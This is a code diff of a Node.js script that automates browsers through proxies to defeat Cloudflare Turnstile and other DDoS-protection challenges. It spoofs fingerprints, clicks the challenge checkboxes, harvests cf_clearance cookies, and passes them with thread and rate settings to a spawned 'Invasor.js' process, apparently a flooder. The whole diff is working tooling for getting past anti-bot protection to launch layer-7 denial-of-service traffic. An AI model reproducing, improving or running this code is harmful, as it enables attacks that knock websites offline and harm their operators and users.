@@ -7,9 +7,6 @@ const { exec, spawn } = require("child_process");
 
 const COOKIES_MAX_RETRIES = 2;
 
-// ────────────────────────────────────────────────
-// Colors
-// ────────────────────────────────────────────────
 const c = {
   reset:   "\x1b[0m",
   bold:    "\x1b[1m",
@@ -30,9 +27,6 @@ function a(type, text) {
   console.log(`${PREFIX}${c.gray}&${c.reset} ${c.white}${text}${c.reset}`);
 }
 
-// ────────────────────────────────────────────────
-// Startup banner
-// ────────────────────────────────────────────────
 function b() {
   console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some peace of mind${c.reset}`);
   console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some paradise${c.reset}`);
@@ -54,7 +48,7 @@ const threads = parseInt(process.argv[4], 10);
 const rates = process.argv[5];
 const proxyFile = process.argv[6];
 
-const e = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
+const e = ms => new Promise(resolve => setTimeout(resolve, ms));
 
 const f = (filePath) => {
   try {
@@ -68,164 +62,143 @@ const f = (filePath) => {
 
 const proxies = f(proxyFile);
 
-const g = () => {
-  const chromeVersions = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-  ];
-  return chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
-};
-
 async function h(page, browserProxy) {
-  const content = await page.content();
+  const hasChallenge = await page.evaluate(() => {
+    const title = document.title.toLowerCase();
+    const body = document.body?.innerText?.toLowerCase() || '';
+    return title.includes('just a moment') ||
+      title.includes('checking') ||
+      title.includes('attention required') ||
+      body.includes('checking your browser') ||
+      !!document.querySelector('.cf-turnstile') ||
+      !!document.querySelector('#challenge-form') ||
+      !!document.querySelector('#challenge-stage');
+  });
 
-  // Cloudflare Turnstile challenge detection (2024-2026)
-  const isTurnstile = content.includes("cf-turnstile") ||
-    content.includes("challenges.cloudflare.com/turnstile") ||
-    content.includes("turnstile.js");
-
-  // Legacy challenge-platform detection
-  const isLegacyChallenge = content.includes("challenge-platform") ||
-    content.includes("challenge-running");
-
-  // Managed challenge / interstitial
-  const isManagedChallenge = content.includes("managed-challenge") ||
-    content.includes("cf-challenge-running");
-
-  if (isTurnstile || isLegacyChallenge || isManagedChallenge) {
-    const challengeType = isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed";
-    a("info", `Detected ${challengeType} challenge → ${browserProxy}`);
-    try {
-      // Wait for Turnstile to fully render
-      a("info", `Waiting for challenge to render → ${browserProxy}`);
-      await e(12);
-
-      // Poll for challenge resolution with multiple click attempts
-      for (let attempt = 0; attempt < 4; attempt++) {
-        // Check if already solved
-        const title = await page.title();
-        if (!title.includes("Just a moment") && !title.includes("Attention Required")) {
-          a("info", `Challenge solved → ${browserProxy}`);
-          break;
-        }
-
-        // Try Turnstile iframe checkbox
-        const frames = page.frames();
-        for (const frame of frames) {
-          const url = frame.url();
-          if (url.includes("challenges.cloudflare.com") || url.includes("turnstile")) {
-            a("info", `Found CF frame: ${url.substring(0, 60)}... (attempt ${attempt + 1}) → ${browserProxy}`);
-            try {
-              await frame.waitForSelector('input[type="checkbox"], .cb-lb, .mark, .ctp-checkbox-label, #challenge-stage', { timeout: 8000 });
-              const checkbox = await frame.$('input[type="checkbox"]') ||
-                await frame.$('.cb-lb') ||
-                await frame.$('.ctp-checkbox-label') ||
-                await frame.$('.mark');
-              if (checkbox) {
-                const cbox = await checkbox.boundingBox();
-                if (cbox) {
-                  await page.mouse.click(cbox.x + cbox.width / 2, cbox.y + cbox.height / 2);
-                  a("info", `Clicked Turnstile checkbox → ${browserProxy}`);
-                  await e(8);
-                  continue;
-                }
-              }
-            } catch (err) {}
-          }
-        }
-
-        // Fallback: click challenge container on main page
-        try {
-          const el = await page.$("#challenge-stage") ||
-            await page.$(".cf-turnstile") ||
-            await page.$("iframe[src*='challenges.cloudflare']") ||
-            await page.$("body > div.main-wrapper > div > div > div > div");
-          if (el) {
-            const box = await el.boundingBox();
-            if (box) {
-              await page.mouse.click(box.x + 20, box.y + 20);
-              a("info", `Clicked challenge element (attempt ${attempt + 1}) → ${browserProxy}`);
-            }
-          }
-        } catch (err) {}
-
-        await e(8);
-      }
-    } catch (error) {
-      a("error", `Error in challenge detection: ${error.message}`);
-    }
-  } else {
-    a("warn", `No challenge detected → ${browserProxy}`);
-    await e(3);
+  if (!hasChallenge) {
+    a("info", `No challenge detected → ${browserProxy}`);
+    await e(2000);
+    return;
   }
+
+  a("info", `Challenge detected → ${browserProxy}`);
+
+  // Try clicking checkbox on main page
+  try {
+    await page.waitForSelector('input[type="checkbox"]', { visible: true, timeout: 5000 });
+    await page.click('input[type="checkbox"]');
+    a("info", `Clicked checkbox → ${browserProxy}`);
+  } catch {
+    // Try inside CF iframe
+    const frames = page.frames();
+    for (const frame of frames) {
+      if (frame.url().includes('challenges.cloudflare.com')) {
+        try {
+          await frame.click('input[type="checkbox"]');
+          a("info", `Clicked checkbox inside iframe → ${browserProxy}`);
+          break;
+        } catch {}
+      }
+    }
+  }
+
+  // Poll up to 60s for challenge to solve
+  a("info", `Waiting for challenge to solve → ${browserProxy}`);
+  let solved = false;
+  for (let i = 0; i < 30; i++) {
+    await e(2000);
+    const stillChallenge = await page.evaluate(() => {
+      const title = document.title.toLowerCase();
+      return title.includes('just a moment') || title.includes('checking') || title.includes('attention required');
+    });
+    if (!stillChallenge) {
+      a("info", `Challenge solved → ${browserProxy}`);
+      solved = true;
+      break;
+    }
+    if (i > 0 && i % 5 === 0) {
+      a("info", `Still waiting... (${(30 - i) * 2}s left) → ${browserProxy}`);
+    }
+  }
+
+  if (!solved) {
+    a("warn", `Challenge timeout → ${browserProxy}`);
+  }
+
+  // Wait for cookies to settle
+  await e(5000);
 }
 
 async function i(targetURL, browserProxy) {
-  const userAgent = g();
   const isRaw = browserProxy === "raw";
   let browser;
   try {
     const launchArgs = [
-      "--no-sandbox",
-      "--disable-setuid-sandbox",
-      "--ignore-certificate-errors",
-      "--ignore-certificate-errors-spki-list",
-      "--disable-gpu",
-      "--disable-dev-shm-usage",
-      "--disable-browser-side-navigation",
-      "--disable-features=IsolateOrigins,site-per-process,NetworkService",
-      "--disable-web-security",
-      "--allow-running-insecure-content",
-      `--user-agent=${userAgent}`,
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-blink-features=AutomationControlled',
     ];
-    if (!isRaw) launchArgs.unshift(`--proxy-server=${browserProxy}`);
+    if (!isRaw) launchArgs.push(`--proxy-server=${browserProxy}`);
 
     const result = await connect({
-      headless: "auto",
+      headless: false,
       args: launchArgs,
       turnstile: true,
-      fingerprint: true,
-      connectOption: {
-        defaultViewport: null,
+      fingerprint: {
+        devices: ['desktop'],
+        locales: ['en-US'],
+        screens: ['1920x1080'],
+      },
+      customConfig: {
+        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+        viewport: { width: 1920, height: 1080 },
       },
     });
 
     browser = result.browser;
     const page = result.page;
 
-    page.setDefaultNavigationTimeout(60 * 1000);
+    page.setDefaultNavigationTimeout(60000);
 
-    // Retry navigation up to 3 times on network errors
+    // Retry navigation up to 3 times
     let navSuccess = false;
     for (let attempt = 0; attempt < 3 && !navSuccess; attempt++) {
       try {
-        await page.goto(targetURL, { waitUntil: "networkidle2", timeout: 45000 });
+        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 60000 });
         navSuccess = true;
       } catch (navErr) {
         a("warn", `Nav attempt ${attempt + 1}/3 failed → ${browserProxy}: ${navErr.message}`);
-        if (attempt < 2) await e(2);
+        if (attempt < 2) await e(3000);
       }
     }
-    if (!navSuccess) throw new Error(`Navigation failed after 3 attempts`);
+    if (!navSuccess) throw new Error('Navigation failed after 3 attempts');
 
     await h(page, browserProxy);
 
     const title = await page.title();
-    const cookies = await page.cookies(targetURL);
 
-    return {
-      browser,
-      title,
-      browserProxy,
-      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
-      userAgent
-    };
+    // Retry cookie extraction up to 5 times for cf_clearance
+    let cookies = await page.cookies();
+    let cfClearance = cookies.find(ck => ck.name === 'cf_clearance');
+
+    if (!cfClearance) {
+      for (let attempt = 0; attempt < 5; attempt++) {
+        await e(3000);
+        cookies = await page.cookies();
+        cfClearance = cookies.find(ck => ck.name === 'cf_clearance');
+        if (cfClearance) {
+          a("info", `cf_clearance found (attempt ${attempt + 1}) → ${browserProxy}`);
+          break;
+        }
+      }
+    }
+
+    const userAgent = await page.evaluate(() => navigator.userAgent);
+    const cookieStr = cookies.map(ck => ck.name + "=" + ck.value).join("; ").trim();
+
+    return { browser, title, browserProxy, cookies: cookieStr, userAgent };
   } catch (error) {
-    a("error", `Error in i: ${error.message}`);
+    a("error", `Browser error: ${error.message} → ${browserProxy}`);
     if (browser) await browser.close();
     return null;
   }
@@ -233,36 +206,34 @@ async function i(targetURL, browserProxy) {
 
 async function j(targetURL, browserProxy, task, done, retries = 0) {
   if (retries >= COOKIES_MAX_RETRIES) {
-    const currentTask = queue.length();
-    done(null, { task, currentTask });
+    done(null, { task });
     return;
   }
   let browser = null;
   try {
     const response = await i(targetURL, browserProxy);
     if (!response) {
-      throw new Error("Failed to open browser or retrieve response");
+      throw new Error("Failed to open browser");
     }
     browser = response.browser;
 
-    // CF challenge fail titles
     const failTitles = [
-      "Just a moment...",
-      "Attention Required! | Cloudflare",
-      "Please Wait... | Cloudflare",
-      "Checking your browser before accessing",
+      "Just a moment",
+      "Attention Required",
+      "Please Wait",
+      "Checking your browser",
       "DDOS-GUARD",
     ];
 
     if (failTitles.some(t => response.title.includes(t))) {
-      a("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
+      a("error", `Bypass failed → ${response.title} | ${response.browserProxy}`);
       if (browser) await browser.close();
-      done(null, { task, currentTask: queue.length() });
+      done(null, { task });
       return;
     }
 
-    a("success", `Bypassed → ${response.title} | ${response.browserProxy}`);
-    a("success", `Cookies → ${response.cookies}`);
+    a("info", `Bypassed → ${response.title} | ${response.browserProxy}`);
+    a("info", `Cookies → ${response.cookies.substring(0, 80)}...`);
 
     spawn("node", [
       "Invasor.js",
@@ -276,9 +247,9 @@ async function j(targetURL, browserProxy, task, done, retries = 0) {
     ]);
 
     if (browser) await browser.close();
-    done(null, { task, currentTask: queue.length() });
+    done(null, { task });
   } catch (error) {
-    a("error", `Error in j: ${error.message}`);
+    a("error", `Thread error: ${error.message} → ${browserProxy}`);
     if (browser) await browser.close();
     await j(targetURL, browserProxy, task, done, retries + 1);
   }
@@ -299,17 +270,11 @@ async function k() {
     queue.push({ browserProxy });
   }
 
-  await e(duration);
+  await e(duration * 1000);
 
-  exec('pkill -f Invasor.js', (err) => {
-    if (err) a("error", `Error killing Invasor.js: ${err.message}`);
-  });
-  exec('pkill chrome', (err) => {
-    if (err) a("error", `Error killing chrome: ${err.message}`);
-  });
-  exec('pkill chromium', (err) => {
-    if (err) a("error", `Error killing chromium: ${err.message}`);
-  });
+  exec('pkill -f Invasor.js', () => {});
+  exec('pkill chrome', () => {});
+  exec('pkill chromium', () => {});
   process.exit();
 }
 
